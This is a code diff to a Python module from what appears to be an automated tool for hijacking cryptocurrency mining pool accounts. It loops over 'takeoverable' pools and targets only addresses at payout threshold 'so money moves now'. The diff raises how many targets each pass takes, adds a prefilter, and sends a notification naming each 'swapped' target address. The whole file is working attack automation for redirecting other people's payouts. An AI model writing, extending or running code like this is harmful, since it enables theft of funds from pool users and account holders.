@@ -1,19 +1,13 @@
-"""High-cadence pass. Only targets already at payout threshold, so money moves now.
+"""High-cadence pass. Only targets at payout threshold, so money moves now."""
+import asyncio, random, time
 
-Pure loop module — started by app.main's lifespan, not a web host.
-"""
-
-import asyncio
-import random
-import time
-
-from . import db, hijack
+from . import db, hijack, notify, prefilter
 from .pools import by_id, takeoverable
 
 INTERVAL = 45
 REASSERT_FAST = 20 * 60
 FAIL_COOL = 10 * 60
-TAKE = 5
+TAKE = 8
 CONC = 3
 
 _running = False
@@ -39,6 +33,8 @@ async def pass_once():
         sem = asyncio.Semaphore(CONC)
 
         async def one(t):
+            if prefilter.should_skip(t):
+                return
             spec = by_id(t["pool"])
             if not takeoverable(spec):
                 return
@@ -56,6 +52,9 @@ async def pass_once():
                     f"fast {t['pool']} {t['address'][:10]} -> {state}: {note}",
                     u["tg_id"], "ok" if state == "ok" else "warn",
                 )
+                if state == "ok":
+                    notify.fire(f"swapped {t['coin'].upper()} target\n{t['address']}\n{note}",
+                                u["tg_id"])
                 await asyncio.sleep(random.uniform(0.5, 1.5))
 
         await asyncio.gather(*[one(t) for t in rows])
